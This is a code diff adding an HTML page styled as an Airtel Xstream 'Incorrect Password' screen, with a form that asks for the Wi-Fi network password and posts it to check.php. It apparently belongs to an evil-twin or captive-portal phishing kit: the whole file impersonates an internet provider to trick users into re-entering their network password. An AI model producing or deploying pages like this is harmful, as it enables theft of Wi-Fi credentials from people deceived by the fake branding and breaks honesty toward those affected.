@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Incorrect Password</title>
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo">
+        <img src="/airtel-xstream.svg" alt="Airtel Logo" />
+      </div>
+      <h2>Incorrect Password</h2>
+      <p>
+        The password you entered is incorrect. Please try again to regain
+        internet access.
+      </p>
+
+      <!-- Retry Form -->
+      <form
+        class="password-form"
+        action="check.php"
+        method="post"
+        onsubmit="return validatePassword()"
+      >
+        <label for="wifi-password">Network Password</label>
+        <input
+          type="password"
+          id="wifi-password"
+          name="wifi-password"
+          placeholder="Enter password"
+          required
+        />
+        <button type="submit">Try Again</button>
+      </form>
+
+      <p class="footer-text">
+        Forgot your password? Contact our support team for assistance.
+      </p>
+    </div>
+
+    <!-- JavaScript for password validation -->
+    <script>
+      function validatePassword() {
+        const password = document.getElementById("wifi-password").value;
+
+        if (password.length < 8) {
+          alert("Password must be at least 8 characters long.");
+          return false; // Prevent form submission
+        }
+        return true; // Allow form submission
+      }
+    </script>
+  </body>
+</html>
